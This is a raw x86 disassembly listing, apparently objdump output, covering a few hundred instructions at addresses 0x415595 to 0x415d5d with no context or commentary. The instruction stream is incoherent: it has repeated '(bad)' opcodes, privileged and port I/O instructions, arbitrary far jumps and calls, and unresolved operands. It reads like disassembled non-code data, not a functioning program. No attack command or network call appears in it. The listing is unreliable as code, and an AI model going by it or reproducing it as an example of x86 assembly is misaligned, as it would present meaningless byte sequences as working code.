  415595:	adc    BYTE PTR [edi-0x7f19a4da],dl
  41559b:	arpl   WORD PTR [ecx+eax*1-0x3b70caf],si
  4155a2:	fxch   st(3)
  4155a4:	dec    ebp
  4155a5:	ffreep st(7)
  4155a7:	xlat   BYTE PTR ds:[ebx]
  4155a9:	push   ebx
  4155aa:	xchg   ecx,eax
  4155ab:	into   
  4155ac:	inc    edx
  4155ad:	sbb    edx,ebp
  4155af:	cs loope 0x4155ef
  4155b2:	scas   al,BYTE PTR es:[edi]
  4155b3:	dec    esp
  4155b4:	pop    ebp
  4155b5:	cmp    DWORD PTR [edi-0x2a],0x41
  4155b9:	popa   
  4155ba:	int3   
  4155bb:	xor    DWORD PTR [eax-0x6b9edda9],edi
  4155c1:	and    dh,al
  4155c3:	in     al,0xf3
  4155c5:	jns    0x4155fc
  4155c7:	hlt    
  4155c8:	out    dx,eax
  4155c9:	(bad)  gs:[eax]
  4155cc:	cs inc eax
  4155ce:	imul   esi,DWORD PTR ds:0x35c6270a,0xb77b034e
  4155d8:	rol    DWORD PTR [eax-0x5104f984],cl
  4155de:	and    eax,0x3c446847
  4155e3:	sbb    al,0x65
  4155e5:	jmp    0x536b3252
  4155ea:	(bad)  
  4155eb:	adc    al,0xe8
  4155ed:	jle    0x415607
  4155ef:	fwait
  4155f0:	sti    
  4155f1:	inc    edx
  4155f2:	in     eax,dx
  4155f3:	hlt    
  4155f4:	xchg   edx,eax
  4155f5:	mov    al,ds:0x9df3b0ac
  4155fa:	jge    0x41565a
  4155fc:	inc    edi
  4155fd:	inc    esp
  4155fe:	pop    eax
  4155ff:	or     eax,0x82541ce9
  415604:	hlt    
  415605:	ins    DWORD PTR es:[edi],dx
  415606:	outs   dx,BYTE PTR ds:[esi]
  415607:	mov    eax,ds:0x1d121c35
  41560c:	gs repz add eax,0x2f2caac5
  415613:	xor    al,0x13
  415615:	popf   
  415616:	pop    ss
  415617:	mov    ch,0x67
  415619:	inc    ebx
  41561a:	jle    0x4155dd
  41561c:	and    bl,BYTE PTR [ecx+0x3a]
  41561f:	cmp    BYTE PTR [edi+0x1e],ah
  415622:	lds    edi,FWORD PTR [edx]
  415624:	les    eax,FWORD PTR [ebx+0x5f9adbaa]
  41562a:	cdq    
  41562b:	test   BYTE PTR [edx+0x41bc083],bh
  415631:	scas   al,BYTE PTR es:[edi]
  415632:	(bad)  
  415633:	daa    
  415634:	pop    eax
  415635:	test   BYTE PTR [eax+ecx*2-0x28bf633],ah
  41563c:	les    ebp,FWORD PTR [edi-0x39eb14d7]
  415642:	xchg   esi,eax
  415643:	nop
  415644:	add    ah,0xea
  415647:	gs pop es
  415649:	call   0x923d:0x36d5d758
  415650:	jle    0x415623
  415652:	inc    esi
  415653:	and    edi,DWORD PTR [ebx+0x27]
  415656:	adc    bh,BYTE PTR [esi-0x57]
  415659:	add    al,0xa2
  41565b:	lds    ecx,FWORD PTR [ebx+ebp*8-0x52]
  41565f:	mov    WORD PTR [esi-0x1f],?
  415662:	xor    edx,ecx
  415664:	pop    edi
  415665:	cs (bad) 
  415667:	cmp    eax,0x7133f532
  41566c:	jmp    0x415675
  41566e:	aad    0x79
  415670:	dec    eax
  415671:	mov    WORD PTR [ebx+0x1d],cs
  415674:	jmp    0x5c9767ba
  415679:	nop
  41567a:	out    0x96,eax
  41567c:	sub    dh,BYTE PTR ds:0x742eac34
  415682:	xor    ah,dh
  415684:	push   ds
  415685:	push   ds
  415686:	bound  esi,QWORD PTR [ecx+0x60ef07a3]
  41568c:	pop    ss
  41568d:	ins    BYTE PTR es:[edi],dx
  41568e:	push   ss
  41568f:	xor    BYTE PTR [edx],bl
  415691:	js     0x41561e
  415693:	ror    ch,1
  415695:	cmp    al,0xa2
  415697:	adc    edx,ebp
  415699:	test   DWORD PTR [ebx+0x2a],ebp
  41569c:	or     eax,0x3b4caace
  4156a1:	mov    bh,0xb0
  4156a3:	jl     0x415718
  4156a5:	pavgw  mm5,QWORD PTR [ebx+0x3103827b]
  4156ac:	dec    esp
  4156ad:	fnstsw WORD PTR [eax]
  4156af:	outs   dx,DWORD PTR ds:[esi]
  4156b0:	dec    edx
  4156b1:	jne    0x415687
  4156b3:	mov    ecx,DWORD PTR [edi-0x70265087]
  4156b9:	dec    edi
  4156ba:	push   ds
  4156bb:	mov    ?,WORD PTR [eax]
  4156bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156be:	inc    edi
  4156bf:	test   DWORD PTR [ebp+0x443c32e0],0x2532cdaf
  4156c9:	push   ds
  4156ca:	loopne 0x41565f
  4156cc:	add    bl,BYTE PTR [ecx]
  4156ce:	enter  0x8df,0xf2
  4156d2:	jp     0x41566e
  4156d4:	pop    ebx
  4156d5:	arpl   WORD PTR [esi+0x75],di
  4156d8:	inc    eax
  4156d9:	dec    eax
  4156da:	inc    edx
  4156db:	mov    cl,ah
  4156dd:	rol    al,1
  4156df:	leave  
  4156e0:	or     edi,DWORD PTR [esi]
  4156e2:	sub    BYTE PTR [ecx-0x2309767b],cl
  4156e8:	mov    edx,0xb864e8c3
  4156ed:	mov    ch,0x81
  4156ef:	int3   
  4156f0:	(bad)  
  4156f1:	mov    dh,0x13
  4156f3:	rcl    BYTE PTR [eax],0x46
  4156f6:	xlat   BYTE PTR ds:[ebx]
  4156f7:	outs   dx,DWORD PTR ds:[esi]
  4156f8:	dec    eax
  4156f9:	pop    eax
  4156fa:	ds pop ss
  4156fc:	and    DWORD PTR [ecx+eax*1-0x20],0xffffffa8
  415701:	dec    eax
  415702:	and    al,0xea
  415704:	jno    0x4156d7
  415706:	adc    BYTE PTR [edx+0x24fefaac],ch
  41570c:	clc    
  41570d:	or     esp,edx
  41570f:	jl     0x4156bb
  415711:	aam    0xa
  415713:	imul   edx,DWORD PTR [edx+0xc],0xffffff89
  415717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415718:	ins    BYTE PTR es:[edi],dx
  415719:	fisub  WORD PTR [ecx+0x58]
  41571c:	xor    ah,ah
  41571e:	push   cs
  41571f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415720:	imul   ebp,DWORD PTR [esi-0x65],0x75
  415724:	add    edi,0xc03705b0
  41572a:	xchg   ecx,eax
  41572b:	sbb    al,0x19
  41572d:	sub    DWORD PTR [ebx-0x55],0x54
  415731:	call   DWORD PTR [ecx+0xb06f317]
  415737:	fild   WORD PTR [edx+0x7]
  41573a:	retf   
  41573b:	dec    ebx
  41573c:	mov    ds:0x42c4604e,al
  415741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415742:	test   DWORD PTR [ebx+0x5a509a9b],eax
  415748:	mov    bh,0x1
  41574a:	cli    
  41574b:	fwait
  41574c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41574d:	and    DWORD PTR [edi],0x824972cf
  415753:	sti    
  415754:	or     BYTE PTR [esi+0x10a9de66],bh
  41575a:	sub    DWORD PTR [edi+0x6b0d9537],edx
  415760:	shr    DWORD PTR [esi-0x7f72be],1
  415766:	jns    0x415709
  415768:	je     0x4156fa
  41576a:	scas   eax,DWORD PTR es:[edi]
  41576b:	add    al,0xe9
  41576d:	mov    eax,0xf719c9d3
  415772:	push   ds
  415773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415774:	ds jmp 0x41578c
  415777:	and    edi,DWORD PTR [ebx]
  415779:	(bad)  
  41577a:	out    0xb8,al
  41577c:	pop    edx
  41577d:	xor    eax,DWORD PTR [edi]
  41577f:	std    
  415780:	out    dx,al
  415781:	lock jo 0x4157c9
  415784:	sahf   
  415785:	mov    ecx,0x5d35357f
  41578a:	mov    eax,0x3dae7835
  41578f:	add    DWORD PTR [edx-0x44],edi
  415792:	sbb    ebx,DWORD PTR [esi-0x124d4850]
  415798:	in     al,0x48
  41579a:	shl    ebp,0xb4
  41579d:	xchg   ebp,eax
  41579e:	cwde   
  41579f:	pop    esp
  4157a0:	sub    DWORD PTR [ebx],esp
  4157a2:	retf   0xc5ac
  4157a5:	mov    al,BYTE PTR [ebp+edi*8+0x2f]
  4157a9:	and    eax,0xe696c05e
  4157ae:	rcr    DWORD PTR [esi+0x6ae628a1],1
  4157b4:	retf   0xdf9b
  4157b7:	mov    DWORD PTR [esi],ebx
  4157b9:	dec    ebx
  4157ba:	imul   edx,DWORD PTR [edx],0x26
  4157bd:	xchg   esp,eax
  4157be:	ficom  DWORD PTR [esi+0x7d7f764b]
  4157c4:	dec    esi
  4157c5:	aad    0x8b
  4157c7:	xor    dh,al
  4157c9:	mov    ds:0x10ddfec0,eax
  4157ce:	cwde   
  4157cf:	mov    dh,0xcc
  4157d1:	aad    0x90
  4157d3:	es mov ebp,0x26f8797b
  4157d9:	pusha  
  4157da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157db:	ret    0xffda
  4157de:	hlt    
  4157df:	ror    DWORD PTR [esi-0x2d],cl
  4157e2:	js     0x415816
  4157e4:	das    
  4157e5:	and    DWORD PTR [edx-0x7b61b703],ecx
  4157eb:	pop    ecx
  4157ec:	xchg   esi,eax
  4157ed:	jecxz  0x415838
  4157ef:	arpl   WORD PTR [ebp+ecx*8-0x2eaec051],si
  4157f6:	loope  0x415835
  4157f8:	(bad)
  4157fc:	(bad)  
  4157fd:	lds    ebx,FWORD PTR [esi]
  4157ff:	mov    edx,0x1130e80c
  415804:	xor    al,0xc1
  415806:	xor    eax,0x2615f132
  41580b:	xchg   edx,eax
  41580c:	ins    BYTE PTR es:[edi],dx
  41580d:	sbb    al,0x63
  415810:	jbe    0x4157f1
  415812:	xor    eax,0x403b8609
  415817:	repz cmp edi,edi
  41581a:	mov    ?,WORD PTR [eax]
  41581c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41581d:	stc    
  41581e:	mov    ecx,0x52ea2efa
  415823:	fldenv [ecx]
  415825:	pop    ds
  415826:	inc    ecx
  415827:	pop    ds
  415828:	mov    gs,ebp
  41582a:	adc    BYTE PTR [edi],ah
  41582c:	pop    esi
  41582d:	fld    DWORD PTR [ecx-0x42]
  415830:	imul   edi,DWORD PTR [ecx+0x66],0x59705dca
  415837:	sbb    al,0xf2
  415839:	(bad)  
  41583a:	fld    TBYTE PTR [ebx+0x9]
  41583d:	pop    esp
  41583e:	aad    0x64
  415840:	lds    ebp,FWORD PTR [eax]
  415842:	stos   DWORD PTR es:[edi],eax
  415843:	cli    
  415844:	lds    ebx,FWORD PTR [edi]
  415846:	sbb    ebp,esi
  415848:	shl    ah,1
  41584a:	add    BYTE PTR [esi+0x1a],0xac
  41584e:	pop    ebp
  41584f:	out    0x9e,eax
  415851:	mov    ecx,DWORD PTR [ecx]
  415853:	(bad)  
  415854:	sub    bh,ah
  415856:	mov    fs,WORD PTR [esi-0x3425be6d]
  41585c:	mov    WORD PTR [ebx-0x15],cs
  41585f:	add    DWORD PTR [eax],ecx
  415861:	xlat   BYTE PTR ds:[ebx]
  415862:	jmp    0x5aa6:0xc66ea99
  415869:	dec    esi
  41586a:	jmp    0x2560:0xc9cf7647
  415871:	imul   ebx,DWORD PTR [si-0x42],0x5c
  415876:	scas   al,BYTE PTR es:[edi]
  415877:	jp     0x415868
  415879:	jle    0x41582d
  41587b:	rol    BYTE PTR [edx-0x61],cl
  41587e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41587f:	jge    0x4158ac
  415881:	(bad)  
  415882:	push   cx
  415884:	jo     0x4158cc
  415886:	mov    ds:0xcda31256,eax
  41588b:	dec    BYTE PTR [esi]
  41588d:	pop    eax
  41588e:	es xor al,0xae
  415891:	sbb    DWORD PTR [edi],edi
  415893:	cdq    
  415894:	adc    al,BYTE PTR [esi+edi*1]
  415897:	dec    ebp
  415898:	dec    ecx
  415899:	daa    
  41589a:	shl    DWORD PTR [esi+0x24],1
  41589d:	rcr    DWORD PTR [ecx],0x44
  4158a0:	add    DWORD PTR [edi+0x94c13da],0x4d
  4158a7:	or     DWORD PTR [ebp+edi*2-0x10],0xaf3c1a4e
  4158af:	mov    ecx,0x7dd2570
  4158b4:	jp     0x415925
  4158b6:	sbb    edx,DWORD PTR [edi-0x58]
  4158b9:	out    0xe3,eax
  4158bb:	mov    ah,BYTE PTR [ecx]
  4158bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158be:	or     eax,0xc9614cb6
  4158c3:	out    dx,eax
  4158c4:	pop    edi
  4158c5:	jno    0x4158c2
  4158c7:	int    0x3
  4158c9:	mov    ah,0xe5
  4158cb:	dec    esi
  4158cc:	and    al,ah
  4158ce:	push   ebp
  4158cf:	ja     0x415949
  4158d1:	sub    al,0x55
  4158d3:	push   edi
  4158d4:	ret    0x743e
  4158d7:	xchg   ebp,eax
  4158d8:	shr    BYTE PTR [esi+0x7f],0xf4
  4158dc:	fidiv  WORD PTR [eax+edi*4+0x4a]
  4158e0:	es jmp 0x35916192
  4158e6:	fsubr  QWORD PTR [eax+0x2433417f]
  4158ec:	ficomp DWORD PTR [edi-0x3ef9860f]
  4158f2:	push   es
  4158f3:	sub    al,BYTE PTR [edx-0x417c881d]
  4158f9:	sub    BYTE PTR [ebx],0xdc
  4158fc:	mov    dh,0xf1
  4158fe:	xchg   edx,eax
  4158ff:	ins    BYTE PTR es:[edi],dx
  415900:	icebp  
  415901:	mov    edx,0x501ec11e
  415906:	sbb    eax,0x62846283
  41590b:	repnz push edi
  41590d:	add    dl,BYTE PTR [ebx+0x21e44fdc]
  415913:	and    eax,0x4eddc0fe
  415918:	loopne 0x4158f9
  41591a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591b:	sbb    al,0x55
  41591d:	push   cs
  41591e:	xchg   edx,eax
  41591f:	pop    ecx
  415920:	neg    BYTE PTR [ebx+ebp*4]
  415923:	mov    ds:0x738341d1,al
  415928:	les    ebx,FWORD PTR [ecx+ecx*8-0x3c]
  41592c:	ret    
  41592d:	sub    dh,BYTE PTR [eax+edi*4-0x37]
  415931:	jnp    0x415950
  415933:	xor    DWORD PTR [ecx],esi
  415935:	pop    es
  415936:	mov    ecx,0x55751903
  41593b:	ror    BYTE PTR [edi+edx*2+0x3c484a67],cl
  415942:	push   edx
  415943:	jns    0x415975
  415945:	das    
  415946:	mov    BYTE PTR [ebx-0x3b9a7b95],0xd
  41594d:	mov    ah,BYTE PTR [eax+0x60f77c72]
  415953:	call   0x581a890d
  415958:	pop    ds
  415959:	pop    edi
  41595a:	and    BYTE PTR [eax],ch
  41595c:	dec    ebx
  41595d:	xchg   ebp,eax
  41595e:	das    
  41595f:	jecxz  0x4158fe
  415961:	cs jbe 0x415915
  415964:	xchg   ebx,eax
  415965:	mov    ds:0x56687313,al
  41596a:	push   eax
  41596b:	mov    esi,0x7c5f890a
  415970:	hlt    
  415971:	dec    edx
  415972:	jge    0x4159bd
  415974:	dec    ebp
  415975:	test   DWORD PTR [edi-0x31],esi
  415978:	jl     0x415944
  41597a:	or     edi,ebp
  41597c:	and    BYTE PTR [eax+ebx*2+0x6f],ah
  415980:	lds    ebx,FWORD PTR [edx]
  415982:	rcl    DWORD PTR [edx+0x50],cl
  415985:	push   ebp
  415986:	push   ss
  415987:	lock sti 
  415989:	mov    cl,BYTE PTR [esi-0x551d38d2]
  41598f:	push   0xffffffdf
  415991:	and    ecx,esi
  415993:	lods   eax,DWORD PTR ds:[esi]
  415994:	mov    ebp,DWORD PTR fs:[edi+0x5d959b1f]
  41599b:	pop    esi
  41599c:	(bad)  
  41599d:	pop    ds
  41599e:	pop    ecx
  41599f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159a0:	and    DWORD PTR [eax-0x3a6aece],ebp
  4159a6:	test   BYTE PTR [ecx+0x68289e35],bh
  4159ac:	push   es
  4159ad:	jge    0x415950
  4159af:	xor    bl,BYTE PTR [ecx+0x66]
  4159b2:	fdivr  st(6),st
  4159b4:	fs pop eax
  4159b6:	imul   edx,DWORD PTR [eax+0x52],0x2c
  4159ba:	call   0x2551:0xe306b0a1
  4159c1:	jl     0x415955
  4159c3:	add    BYTE PTR [edi+0x7],0xa
  4159c7:	and    al,0xe4
  4159c9:	arpl   WORD PTR ds:0x27b782f1,cx
  4159cf:	hlt    
  4159d0:	or     dl,bl
  4159d2:	dec    edx
  4159d3:	push   edi
  4159d4:	js     0x415a4e
  4159d6:	dec    ecx
  4159d7:	fdiv   QWORD PTR [esi]
  4159d9:	lods   al,BYTE PTR ds:[esi]
  4159da:	mov    ecx,0xee2e4377
  4159df:	jb     0x415a46
  4159e1:	lea    edx,[edi]
  4159e3:	iret   
  4159e4:	sahf   
  4159e5:	push   es
  4159e6:	pusha  
  4159e7:	neg    BYTE PTR [ebp-0x24]
  4159ea:	push   ecx
  4159eb:	xor    esi,DWORD PTR [edi+0x59]
  4159ee:	cmp    BYTE PTR [esi-0x47a54118],bh
  4159f4:	and    BYTE PTR [edi+0x7edecdb5],bl
  4159fa:	add    eax,0x1a520f8f
  4159ff:	hlt    
  415a00:	arpl   bx,ax
  415a02:	mov    ebp,0xc151e2a0
  415a07:	icebp  
  415a08:	adc    al,0x55
  415a0a:	push   esi
  415a0b:	(bad)  
  415a0c:	or     BYTE PTR [esi-0x38ac962c],bh
  415a12:	outs   dx,DWORD PTR ds:[esi]
  415a13:	stos   DWORD PTR es:[edi],eax
  415a14:	adc    BYTE PTR [ebp+0x394ef015],al
  415a1a:	imul   eax,edi,0xe4b16980
  415a20:	pop    edx
  415a21:	iret   
  415a22:	sbb    edx,DWORD PTR [eax]
  415a24:	sbb    BYTE PTR [edi+0x42],bl
  415a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a28:	mov    bh,0x68
  415a2a:	or     eax,0xe91e448a
  415a2f:	xor    DWORD PTR [ecx-0x69256cef],ebp
  415a35:	les    edi,FWORD PTR [ebx-0x75]
  415a38:	mov    WORD PTR [ecx],?
  415a3a:	std    
  415a3b:	push   edi
  415a3c:	dec    edi
  415a3d:	jb     0x415a4e
  415a3f:	stc    
  415a40:	xor    cl,BYTE PTR [ecx]
  415a42:	sbb    BYTE PTR [ecx+0x48cd498b],cl
  415a48:	push   ds
  415a49:	mov    esp,edx
  415a4b:	add    BYTE PTR [esi],0x90
  415a4e:	sub    ebx,DWORD PTR [bp+si]
  415a51:	das    
  415a52:	test   dh,ah
  415a54:	cmp    eax,0xa985766d
  415a59:	ror    BYTE PTR [ebx-0x7fdf72bf],1
  415a5f:	out    0x9e,eax
  415a61:	call   0x399e:0x48be3804
  415a68:	popa   
  415a69:	mov    edi,0x869caf99
  415a6e:	inc    edx
  415a6f:	clc    
  415a70:	cmp    cl,BYTE PTR [edi+0x39]
  415a73:	es ins DWORD PTR es:[edi],dx
  415a75:	push   edi
  415a76:	push   ss
  415a77:	std    
  415a78:	cmp    ah,BYTE PTR [eax+0x3a]
  415a7b:	std    
  415a7c:	arpl   WORD PTR [ecx+eiz*2],bp
  415a7f:	(bad)  
  415a80:	jl     0x415a1e
  415a82:	cdq    
  415a83:	jg     0x415ac0
  415a85:	fiadd  DWORD PTR [edi+0x48]
  415a88:	xchg   DWORD PTR [esi*2-0x284d5513],edx
  415a8f:	div    BYTE PTR [ecx+edi*1+0x4a5c54b3]
  415a96:	jno    0x415a43
  415a98:	mov    WORD PTR [ecx],ss
  415a9a:	cwde   
  415a9b:	stos   BYTE PTR es:[edi],al
  415a9c:	into   
  415a9d:	xchg   ebx,eax
  415a9e:	leave  
  415a9f:	cmc    
  415aa0:	jae    0x415b19
  415aa2:	mov    dl,0xca
  415aa4:	in     al,0xdf
  415aa6:	add    al,0x58
  415aa8:	sbb    dh,BYTE PTR [eax]
  415aaa:	dec    ecx
  415aab:	aas    
  415aac:	xchg   ebx,eax
  415aad:	lahf   
  415aae:	popf   
  415aaf:	or     eax,edx
  415ab1:	iret   
  415ab2:	mov    fs,WORD PTR [eax-0x76]
  415ab5:	(bad)
  415ab8:	hlt    
  415ab9:	xchg   esp,eax
  415aba:	lods   eax,DWORD PTR ds:[esi]
  415abb:	xor    BYTE PTR [bp-0x793a],dh
  415ac0:	sub    eax,0xc932cec5
  415ac5:	in     al,dx
  415ac6:	and    BYTE PTR [ecx-0x47d26dd9],0x70
  415acd:	sbb    eax,0x9a4ce68d
  415ad2:	push   edi
  415ad3:	jno    0x415adb
  415ad5:	imul   edi,DWORD PTR [ebx-0x35],0x7c
  415ad9:	fwait
  415ada:	stc    
  415adb:	cmp    cl,BYTE PTR [esi]
  415add:	and    al,0xc5
  415adf:	and    eax,0x66e997e
  415ae4:	dec    edi
  415ae5:	jno    0x415b1f
  415ae7:	add    ch,BYTE PTR [esi]
  415ae9:	jmp    0x415a6f
  415aeb:	xchg   esi,eax
  415aec:	mov    dh,0x43
  415aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aef:	out    0xd7,al
  415af1:	dec    eax
  415af2:	push   cs
  415af3:	add    eax,0xb78579e
  415af8:	ret    
  415af9:	rcl    dh,cl
  415afb:	scas   eax,DWORD PTR es:[edi]
  415afc:	neg    BYTE PTR [ebp+0x5c]
  415aff:	fisubr DWORD PTR [edx+0x20]
  415b02:	mov    esp,0xaebcf5fe
  415b07:	mov    WORD PTR [eax+0x42d27246],ds
  415b0d:	mov    ch,0x75
  415b0f:	addr16 in eax,0x2d
  415b12:	int3   
  415b13:	pop    ds
  415b14:	adc    al,BYTE PTR [ecx+0x1454d726]
  415b1a:	adc    edx,DWORD PTR [edi]
  415b1c:	imul   esi,DWORD PTR [eax+edi*8-0x15],0x9589a96b
  415b24:	outs   dx,BYTE PTR ds:[esi]
  415b25:	scas   al,BYTE PTR es:[edi]
  415b26:	pop    ebp
  415b27:	or     esp,DWORD PTR ds:0x8a50d84
  415b2d:	arpl   WORD PTR [edx+0xd997670],cx
  415b33:	rcl    esi,1
  415b35:	pusha  
  415b36:	pop    esp
  415b37:	test   edx,edx
  415b39:	aaa    
  415b3a:	les    ecx,FWORD PTR [ebp+0x1c]
  415b3d:	fidivr WORD PTR [ebx+0x7ad6086a]
  415b43:	cmp    eax,0x49805e71
  415b48:	mov    ds:0x39d32cce,al
  415b4d:	stos   DWORD PTR es:[edi],eax
  415b4e:	xor    al,0x8c
  415b50:	mov    al,ds:0xb247e451
  415b55:	sbb    bl,BYTE PTR [ecx-0x4a4c715d]
  415b5b:	xchg   ebp,eax
  415b5c:	aaa    
  415b5d:	rcl    BYTE PTR [eax-0x1e],cl
  415b60:	sbb    ah,al
  415b62:	aas    
  415b63:	or     ecx,DWORD PTR [ecx+0x4a]
  415b66:	rol    ebp,1
  415b68:	pop    edi
  415b69:	dec    esi
  415b6a:	dec    ebp
  415b6b:	xor    eax,0x67a381ff
  415b70:	xor    al,0xf6
  415b72:	ja     0x415b0a
  415b74:	inc    edi
  415b75:	mov    dl,0xe
  415b77:	adc    eax,0xe67a834b
  415b7c:	mov    al,ds:0xcc6455ea
  415b81:	imul   DWORD PTR [eax+0x48]
  415b84:	je     0x415b1f
  415b86:	fidiv  WORD PTR [edi+0x50a34078]
  415b8c:	sbb    ebp,DWORD PTR [edi+0x75fd96ac]
  415b92:	mov    esp,0x1196f157
  415b97:	das    
  415b98:	push   edx
  415b99:	sbb    ecx,DWORD PTR [eax+0x243065ff]
  415b9f:	mov    ah,0x5
  415ba1:	int3   
  415ba2:	or     ebp,DWORD PTR [eax-0x341e3b21]
  415ba8:	cmp    dl,BYTE PTR [edx]
  415baa:	sub    bl,BYTE PTR [ecx]
  415bac:	xor    dh,BYTE PTR [ebp-0xb]
  415baf:	dec    ebp
  415bb0:	lock mov es,WORD PTR [esi]
  415bb3:	jecxz  0x415b51
  415bb5:	int3   
  415bb6:	(bad)  
  415bb8:	lods   eax,DWORD PTR ds:[esi]
  415bb9:	(bad)  
  415bbb:	test   eax,0xf163e04
  415bc0:	or     BYTE PTR [edx+0x6280b9a6],0x63
  415bc7:	push   ds
  415bc8:	add    DWORD PTR [ebx+ebp*1+0x7f],ecx
  415bcc:	ffreep st(7)
  415bce:	xchg   BYTE PTR [ebx+eax*1],ch
  415bd1:	jmp    0x231c9be9
  415bd6:	imul   ebx,edx,0x156864b0
  415bdc:	pusha  
  415bdd:	push   0x58
  415bdf:	pop    esp
  415be0:	mov    cl,0xe5
  415be2:	push   0x37
  415be4:	dec    ecx
  415be5:	push   ss
  415be6:	pushf  
  415be7:	add    DWORD PTR [edx],ebp
  415be9:	mov    bl,0xce
  415beb:	or     eax,DWORD PTR [eax]
  415bed:	in     al,dx
  415bee:	add    bh,bl
  415bf0:	out    dx,eax
  415bf1:	dec    esp
  415bf2:	ds inc ebx
  415bf4:	arpl   dx,di
  415bf6:	pop    gs
  415bf8:	sub    edi,DWORD PTR [edx+edi*2]
  415bfb:	sbb    DWORD PTR [esi+0x40082439],eax
  415c01:	pop    esp
  415c02:	(bad)  [ecx+edi*8+0x2]
  415c06:	arpl   bp,di
  415c08:	in     eax,0x17
  415c0a:	xchg   ebp,eax
  415c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0c:	and    edx,0xa2b99cf2
  415c12:	push   eax
  415c13:	xchg   DWORD PTR [ebp*2-0x51e91ed6],edx
  415c1a:	and    BYTE PTR [eax],0x44
  415c1d:	push   ss
  415c1e:	loopne 0x415c86
  415c20:	pop    ebx
  415c21:	aad    0x44
  415c23:	push   eax
  415c24:	aaa    
  415c25:	mov    ebx,0xde443310
  415c2a:	aad    0x3a
  415c2c:	xchg   ebp,eax
  415c2d:	add    al,0x2b
  415c2f:	add    ebp,DWORD PTR [ecx+0x48]
  415c32:	clc    
  415c33:	push   cs
  415c34:	jle    0x415c56
  415c36:	mov    bh,0x3e
  415c38:	in     eax,0x7f
  415c3a:	fcomp  DWORD PTR ds:0xe19e2f72
  415c40:	test   al,0x8a
  415c42:	push   edx
  415c43:	icebp  
  415c44:	jmp    0x7cdb:0xca7fe194
  415c4b:	pop    es
  415c4c:	fisubr WORD PTR [ebx-0x7b]
  415c4f:	add    eax,0xac5296bc
  415c54:	inc    esp
  415c55:	aam    0x6b
  415c57:	xchg   ebp,eax
  415c58:	sub    DWORD PTR [ecx],edi
  415c5a:	xor    eax,0x878d792e
  415c5f:	push   esi
  415c60:	lds    ebx,FWORD PTR [eax]
  415c62:	fprem1 
  415c64:	sub    esp,edx
  415c66:	loop   0x415cdc
  415c68:	mov    edx,0x82444734
  415c6d:	fst    st(1)
  415c6f:	in     al,0x7d
  415c71:	jle    0x415cd2
  415c73:	xchg   ecx,eax
  415c74:	mov    ecx,0xe5c53195
  415c79:	xchg   BYTE PTR [eax-0x70],ah
  415c7c:	fld    TBYTE PTR ds:0x54eee57d
  415c82:	adc    DWORD PTR [esi+eiz*4+0x20285e99],edx
  415c89:	mov    ah,0x28
  415c8b:	mov    al,0xa8
  415c8d:	xchg   BYTE PTR [ebp+0x60],bl
  415c90:	jle    0x415cc4
  415c92:	or     BYTE PTR [ecx-0x1a],bh
  415c95:	mov    ch,0x57
  415c97:	icebp  
  415c98:	fbld   TBYTE PTR [esi-0x5eca5522]
  415c9e:	mov    cl,0x90
  415ca0:	rol    DWORD PTR [esi+edi*8+0xc],0x9
  415ca5:	test   al,0x99
  415ca7:	std    
  415ca8:	frstor [ecx]
  415caa:	mov    ah,0x28
  415cac:	adc    BYTE PTR [ecx-0x5fa1e1c3],ah
  415cb2:	xchg   BYTE PTR [esi-0x58d47b47],dh
  415cb8:	addr16 mov esp,0x58a10362
  415cbe:	inc    eax
  415cbf:	xor    bl,ch
  415cc1:	push   ebx
  415cc2:	call   0x5d5b:0x1bd99de5
  415cc9:	pop    ds
  415cca:	call   0xc6b93818
  415ccf:	jecxz  0x415cdc
  415cd1:	fs js  0x415cbf
  415cd4:	xchg   ebx,ecx
  415cd6:	xchg   ebx,eax
  415cd7:	imul   esp,DWORD PTR ds:0x641c46b1,0xffffffff
  415cde:	and    ebp,DWORD PTR [edi]
  415ce0:	pusha  
  415ce1:	les    edi,FWORD PTR [edi+0x16]
  415ce4:	xlat   BYTE PTR ds:[ebx]
  415ce5:	imul   ebp,DWORD PTR [edx-0x46bbb36e],0x55d1b26a
  415cef:	fisub  WORD PTR [ebp-0x444c8551]
  415cf5:	inc    edi
  415cf6:	mov    bl,0xc9
  415cf8:	fs sbb al,0x1c
  415cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cfc:	jle    0x415d2f
  415cfe:	mov    DWORD PTR [edx-0x4],edi
  415d01:	sub    DWORD PTR [edi+0xf],esi
  415d04:	jnp    0x415cab
  415d06:	mov    cs,WORD PTR [esi+edx*4-0x2d]
  415d0a:	cmp    DWORD PTR [edx],esp
  415d0c:	es sub eax,0x9161880f
  415d12:	mov    dh,0xd5
  415d14:	test   eax,0xbadb8f37
  415d19:	fiadd  WORD PTR [ebp+0x2401960a]
  415d1f:	mov    edx,0x1d1844a0
  415d24:	dec    edi
  415d25:	int3   
  415d26:	lock xchg ebp,eax
  415d28:	rol    WORD PTR ds:[edx-0x3cd75e41],1
  415d30:	xor    edx,DWORD PTR [esi]
  415d32:	pop    esi
  415d33:	outs   dx,BYTE PTR ds:[esi]
  415d34:	in     eax,dx
  415d35:	arpl   WORD PTR [ecx-0xe54d314],bx
  415d3b:	sbb    BYTE PTR [ebx-0x6f],bh
  415d3e:	and    dl,bl
  415d40:	sahf   
  415d41:	addr16 mov ah,0x34
  415d44:	sub    ebx,DWORD PTR [ebx-0x1]
  415d47:	mov    ds:0xa184d909,eax
  415d4c:	addr16 jnp 0x415d44
  415d4f:	mov    ecx,DWORD PTR [ebp-0x7ebbd4ee]
  415d55:	pushf  
  415d56:	sbb    DWORD PTR [edi-0x7dc7ade0],esi
  415d5c:	pushf  
  415d5d:	nop
